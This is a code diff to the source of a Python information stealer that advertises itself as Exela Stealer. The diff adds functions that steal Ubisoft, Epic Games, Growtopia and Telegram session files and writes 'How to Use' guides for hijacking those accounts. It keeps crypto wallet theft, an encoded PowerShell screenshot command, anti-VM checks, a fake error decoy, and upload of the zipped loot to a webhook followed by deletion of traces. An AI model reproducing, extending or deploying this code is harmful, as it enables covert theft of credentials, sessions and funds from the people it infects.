@@ -10,11 +10,12 @@ import asyncio
 import aiohttp
 import base64
 import time
+
 webhook = '%WEBHOOK%'
 discord_injection = bool("%injection%")
 startup_method = "%startup_method%".lower()
 Anti_VM = bool("%Anti_VM%")
-FakeError = (bool("%fake_error%"), ("System Error", "The Program can't start because api-ms-win-crt-runtime-|l1-1-.dll is missing from your computer. Try reinstalling the program to fix this problem", 0))  
+FakeError = (bool("%fake_error%"), ("System Error", "The Program can't start because api-ms-win-crt-runtime-|l1-1-.dll is missing from your computer. Try reinstalling the program to fix this problem", 0)) 
 
 def create_mutex(mutex_value) -> bool:
     kernel32 = ctypes.windll.kernel32 #kernel32.dll 
@@ -478,6 +479,91 @@ class Main:
                 except:pass
                 for download in downloads:
                     self.download_list.append(f"{download[0]} : {download[1]}\n")
+        except:
+            pass
+    async def StealUplay(self, uuid:str) -> None:
+        try:
+            found_ubisoft = False
+            ubisoft_path = os.path.join(self.LocalAppData, "Ubisoft Game Launcher")
+            copied_path = os.path.join(self.Temp, uuid, "Games", "Uplay")
+            if os.path.isdir(ubisoft_path):
+                if not os.path.exists(copied_path):
+                    os.mkdir(copied_path)
+                for file in os.listdir(ubisoft_path):
+                    name_of_files = os.path.join(ubisoft_path, file)
+                    try:
+                        shutil.copy(name_of_files, os.path.join(copied_path, file))
+                        found_ubisoft = True
+                    except:
+                        continue
+                if found_ubisoft == True:
+                    os.mkdir(os.path.join(copied_path, "How to Use"))
+                    with open(os.path.join(copied_path,"How to Use", "How to Use.txt"), "a", errors="ignore") as write_file:
+                        write_file.write("https://t.me/ExelaStealer\n==============================================\n")
+                        write_file.write("First, open this file path on your computer <%localappdata%\\Ubisoft Game Launcher>.\nDelete all the files here, then copy the stolen files to this folder.\nAfter all this run ubisoft")
+        except:
+            pass
+    async def StealEpicGames(self, uuid:str) -> None:
+        try:
+            found_epic = False
+            epic_path = os.path.join(self.LocalAppData, "EpicGamesLauncher", "Saved", "Config", "Windows")
+            copied_path = os.path.join(self.Temp, uuid, "Games", "Epic Games")
+            if os.path.isdir(epic_path):
+                if not os.path.exists(copied_path):
+                    os.mkdir(copied_path)
+                try:
+                    shutil.copytree(epic_path, os.path.join(copied_path, "Windows"))
+                    found_epic = True
+                except:
+                    pass
+            if found_epic == True:
+                with open(os.path.join(copied_path, "How to Use.txt"), "a", errors="ignore") as write_file:
+                    write_file.write("https://t.me/ExelaStealer\n==============================================\n")
+                    write_file.write("First, open this file path on your computer <%localappdata%\\EpicGamesLauncher\\Saved\\Config\\Windows>.\nDelete all the files here, then copy the stolen files to this folder.\nAfter all this run epic games")
+        except Exception as e:
+            print(str(e))
+    async def StealGrowtopia(self, uuid:str) -> None:
+        try:
+            found_growtopia = False
+            growtopia_path = os.path.join(self.LocalAppData, "Growtopia", "save.dat")
+            copied_path = os.path.join(self.Temp, uuid, "Games", "Growtopia")
+            if os.path.isfile(growtopia_path):
+                found_growtopia = True
+                shutil.copy(growtopia_path, os.path.join(copied_path, "save.dat"))
+            if found_growtopia == True:
+                os.mkdir(os.path.join(copied_path, "How to Use"))
+                with open(os.path.join(copied_path, "How to Use", "How to Use.txt"), "a", errors="ignore") as write_file:
+                    write_file.write("https://t.me/ExelaStealer\n==============================================\n")
+                    write_file.write("First, open this file path on your computer <%localappdata%\\Growtopia>.\nReplace 'save.dat' with the stolen file.")
+        except:
+            pass
+    async def StealTelegramSession(self, directory_path: str) -> None:
+        try:
+            found_tg = False
+            tg_path = os.path.join(self.RoamingAppData, "Telegram Desktop", "tdata")
+            if os.path.exists(tg_path):
+                copy_path = os.path.join(directory_path, "Telegram Session")
+                black_listed_dirs = ["dumps", "emojis", "user_data", "working", "emoji", "tdummy", "user_data#2", "user_data#3", "user_data#4", "user_data#5"]
+                processes = await asyncio.create_subprocess_shell(f"taskkill /F /IM Telegram.exe", shell=True, stdout=asyncio.subprocess.PIPE, stderr=asyncio.subprocess.PIPE)
+                await processes.communicate() 
+                if not os.path.exists(copy_path):
+                    os.mkdir(copy_path)
+                for dirs in os.listdir(tg_path):
+                    try:
+                        _path = os.path.join(tg_path, dirs)
+                        if not dirs in black_listed_dirs:
+                            dir_name = _path.split("\\")[7]
+                            if os.path.isfile(_path):
+                                shutil.copyfile(_path, os.path.join(copy_path, dir_name))
+                            elif os.path.isdir(_path):
+                                shutil.copytree(_path, os.path.join(copy_path, dir_name))
+                            found_tg = True
+                    except:continue
+                if found_tg == True:
+                    os.mkdir(os.path.join(copy_path, "How to Use"))
+                    with open(os.path.join(copy_path, "How to Use", "How to Use.txt"), "a", errors="ignore") as write_file:
+                        write_file.write("https://t.me/ExelaStealer\n=======================================\n")
+                        write_file.write("First, close your telegram\nopen this file path on your computer <%appdata%\\Telegram Desktop\\tdata>.\nDelete all the files here, then copy the stolen files to this folder")
         except:
             pass
     async def RiotGamesSession(self, cookie, browser:str) -> None:
@@ -978,29 +1064,6 @@ class Main:
             pass
         else:
             self.robloxSessionList.append(f"Name : {str(name)}\nDisplay Name : {str(DisplayName)}\nEmail : {str(email)}\nID : {str(id)}\nEmail Verified : {str(isEmailVerified)}\nRobux : {str(robux)}\nCookie : {cookie}\n======================================================================\n")
-    async def StealTelegramSession(self, directory_path: str) -> None:
-        try:
-            tg_path = os.path.join(self.RoamingAppData, "Telegram Desktop","tdata")
-            if os.path.exists(tg_path):
-                copy_path = os.path.join(directory_path, "Telegram Session")
-                black_listed_dirs = ["dumps", "emojis", "user_data", "working", "emoji", "tdummy", "user_data#2", "user_data#3", "user_data#4", "user_data#5"]
-                processes = await asyncio.create_subprocess_shell(f"taskkill /F /IM Telegram.exe", shell=True, stdout=asyncio.subprocess.PIPE, stderr=asyncio.subprocess.PIPE)
-                await processes.communicate() 
-                if not os.path.exists(copy_path):
-                    os.mkdir(copy_path)
-                for dirs in os.listdir(tg_path):
-                    try:
-                        _path = os.path.join(tg_path, dirs)
-                        if not dirs in black_listed_dirs:
-                            dir_name = _path.split("\\")[7]
-                            if os.path.isfile(_path):
-                                shutil.copyfile(_path, os.path.join(copy_path, dir_name))
-                            elif os.path.isdir(_path):
-                                shutil.copytree(_path, os.path.join(copy_path, dir_name))
-                            else:continue
-                    except:continue
-        except:
-            pass
     async def GetTokens(self) -> None:
         try:
             discord_dirs = {
@@ -1545,11 +1608,19 @@ class Main:
             if os.path.isdir(filePath):
                 shutil.rmtree(filePath)
             os.mkdir(filePath)
-            await self.GetWallets(filePath)
-            await self.StealTelegramSession(filePath)
             os.mkdir(os.path.join(filePath, "Browsers"))
             os.mkdir(os.path.join(filePath, "Sessions"))
             os.mkdir(os.path.join(filePath, "Tokens"))
+            os.mkdir(os.path.join(filePath, "Games"))
+            await self.GetWallets(filePath)
+            await self.StealTelegramSession(filePath)
+            await self.StealUplay(uuid)
+            await self.StealEpicGames(uuid)
+            await self.StealGrowtopia(uuid)
+            if len(os.listdir(os.path.join(filePath, "Games"))) == 0:
+                try:
+                    shutil.rmtree(os.path.join(filePath, "Games"))
+                except:pass
             if self.FireFox:
                 os.mkdir(os.path.join(filePath, "Browsers", "Firefox"))
             command = "JABzAG8AdQByAGMAZQAgAD0AIABAACIADQAKAHUAcwBpAG4AZwAgAFMAeQBzAHQAZQBtADsADQAKAHUAcwBpAG4AZwAgAFMAeQBzAHQAZQBtAC4AQwBvAGwAbABlAGMAdABpAG8AbgBzAC4ARwBlAG4AZQByAGkAYwA7AA0ACgB1AHMAaQBuAGcAIABTAHkAcwB0AGUAbQAuAEQAcgBhAHcAaQBuAGcAOwANAAoAdQBzAGkAbgBnACAAUwB5AHMAdABlAG0ALgBXAGkAbgBkAG8AdwBzAC4ARgBvAHIAbQBzADsADQAKAA0ACgBwAHUAYgBsAGkAYwAgAGMAbABhAHMAcwAgAFMAYwByAGUAZQBuAHMAaABvAHQADQAKAHsADQAKACAAIAAgACAAcAB1AGIAbABpAGMAIABzAHQAYQB0AGkAYwAgAEwAaQBzAHQAPABCAGkAdABtAGEAcAA+ACAAQwBhAHAAdAB1AHIAZQBTAGMAcgBlAGUAbgBzACgAKQANAAoAIAAgACAAIAB7AA0ACgAgACAAIAAgACAAIAAgACAAdgBhAHIAIAByAGUAcwB1AGwAdABzACAAPQAgAG4AZQB3ACAATABpAHMAdAA8AEIAaQB0AG0AYQBwAD4AKAApADsADQAKACAAIAAgACAAIAAgACAAIAB2AGEAcgAgAGEAbABsAFMAYwByAGUAZQBuAHMAIAA9ACAAUwBjAHIAZQBlAG4ALgBBAGwAbABTAGMAcgBlAGUAbgBzADsADQAKAA0ACgAgACAAIAAgACAAIAAgACAAZgBvAHIAZQBhAGMAaAAgACgAUwBjAHIAZQBlAG4AIABzAGMAcgBlAGUAbgAgAGkAbgAgAGEAbABsAFMAYwByAGUAZQBuAHMAKQANAAoAIAAgACAAIAAgACAAIAAgAHsADQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgAHQAcgB5AA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAB7AA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAFIAZQBjAHQAYQBuAGcAbABlACAAYgBvAHUAbgBkAHMAIAA9ACAAcwBjAHIAZQBlAG4ALgBCAG8AdQBuAGQAcwA7AA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAHUAcwBpAG4AZwAgACgAQgBpAHQAbQBhAHAAIABiAGkAdABtAGEAcAAgAD0AIABuAGUAdwAgAEIAaQB0AG0AYQBwACgAYgBvAHUAbgBkAHMALgBXAGkAZAB0AGgALAAgAGIAbwB1AG4AZABzAC4ASABlAGkAZwBoAHQAKQApAA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAHsADQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAB1AHMAaQBuAGcAIAAoAEcAcgBhAHAAaABpAGMAcwAgAGcAcgBhAHAAaABpAGMAcwAgAD0AIABHAHIAYQBwAGgAaQBjAHMALgBGAHIAbwBtAEkAbQBhAGcAZQAoAGIAaQB0AG0AYQBwACkAKQANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAHsADQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAGcAcgBhAHAAaABpAGMAcwAuAEMAbwBwAHkARgByAG8AbQBTAGMAcgBlAGUAbgAoAG4AZQB3ACAAUABvAGkAbgB0ACgAYgBvAHUAbgBkAHMALgBMAGUAZgB0ACwAIABiAG8AdQBuAGQAcwAuAFQAbwBwACkALAAgAFAAbwBpAG4AdAAuAEUAbQBwAHQAeQAsACAAYgBvAHUAbgBkAHMALgBTAGkAegBlACkAOwANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAH0ADQAKAA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAcgBlAHMAdQBsAHQAcwAuAEEAZABkACgAKABCAGkAdABtAGEAcAApAGIAaQB0AG0AYQBwAC4AQwBsAG8AbgBlACgAKQApADsADQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAfQANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAfQANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAYwBhAHQAYwBoACAAKABFAHgAYwBlAHAAdABpAG8AbgApAA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAB7AA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAC8ALwAgAEgAYQBuAGQAbABlACAAYQBuAHkAIABlAHgAYwBlAHAAdABpAG8AbgBzACAAaABlAHIAZQANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAfQANAAoAIAAgACAAIAAgACAAIAAgAH0ADQAKAA0ACgAgACAAIAAgACAAIAAgACAAcgBlAHQAdQByAG4AIAByAGUAcwB1AGwAdABzADsADQAKACAAIAAgACAAfQANAAoAfQANAAoAIgBAAA0ACgANAAoAQQBkAGQALQBUAHkAcABlACAALQBUAHkAcABlAEQAZQBmAGkAbgBpAHQAaQBvAG4AIAAkAHMAbwB1AHIAYwBlACAALQBSAGUAZgBlAHIAZQBuAGMAZQBkAEEAcwBzAGUAbQBiAGwAaQBlAHMAIABTAHkAcwB0AGUAbQAuAEQAcgBhAHcAaQBuAGcALAAgAFMAeQBzAHQAZQBtAC4AVwBpAG4AZABvAHcAcwAuAEYAbwByAG0AcwANAAoADQAKACQAcwBjAHIAZQBlAG4AcwBoAG8AdABzACAAPQAgAFsAUwBjAHIAZQBlAG4AcwBoAG8AdABdADoAOgBDAGEAcAB0AHUAcgBlAFMAYwByAGUAZQBuAHMAKAApAA0ACgANAAoADQAKAGYAbwByACAAKAAkAGkAIAA9ACAAMAA7ACAAJABpACAALQBsAHQAIAAkAHMAYwByAGUAZQBuAHMAaABvAHQAcwAuAEMAbwB1AG4AdAA7ACAAJABpACsAKwApAHsADQAKACAAIAAgACAAJABzAGMAcgBlAGUAbgBzAGgAbwB0ACAAPQAgACQAcwBjAHIAZQBlAG4AcwBoAG8AdABzAFsAJABpAF0ADQAKACAAIAAgACAAJABzAGMAcgBlAGUAbgBzAGgAbwB0AC4AUwBhAHYAZQAoACIALgAvAEQAaQBzAHAAbABhAHkAIAAoACQAKAAkAGkAKwAxACkAKQAuAHAAbgBnACIAKQANAAoAIAAgACAAIAAkAHMAYwByAGUAZQBuAHMAaABvAHQALgBEAGkAcwBwAG8AcwBlACgAKQANAAoAfQA=" # Unicode encoded command
@@ -1690,6 +1761,18 @@ class Main:
                     file.write("----------------------https://t.me/ExelaStealer----------------------\n"+ "=" * 70 + "\n")
                     for ip, country,city, timezone, isp in self.NetworkList:
                         file.write(ip + "\n" + country + "\n" + city +"\n" + timezone + "\n" + isp) 
+            if len(os.listdir(os.path.join(filePath, "Sessions"))) == 0:
+                try:
+                    shutil.rmtree(os.path.join(filePath, "Sessions"))
+                except:pass
+            if len(os.listdir(os.path.join(filePath, "Tokens"))) == 0:
+                try:
+                    shutil.rmtree(os.path.join(filePath, "Tokens"))
+                except:pass
+            if len(os.listdir(os.path.join(filePath, "Browsers"))) == 0:
+                try:
+                    shutil.rmtree(os.path.join(filePath, "Browsers"))
+                except:pass
         except:pass
     async def SendContains(self) -> None:
         try:
@@ -1809,6 +1892,11 @@ class Main:
             payload = aiohttp.FormData()
             payload.add_field('file', dosya_verisi, filename=os.path.basename(filePath + ".zip"))
             async with session.post(webhook, data=payload) as f:
+                pass
+            try:
+                os.remove(filePath + ".zip")
+                shutil.rmtree(filePath)
+            except:
                 pass
 class Startup:
     def __init__(self) -> None:
@@ -2111,6 +2199,9 @@ if __name__ == '__main__':
             print("mutex already exist")
             os._exit(0)
         else:
+            if webhook == "%WEBHOOK%":
+                print("you are using default webhook, exiting")
+                os._exit(0)
             start_time = time.time()
             if Anti_VM:
                 asyncio.run(AntiVM().Main())
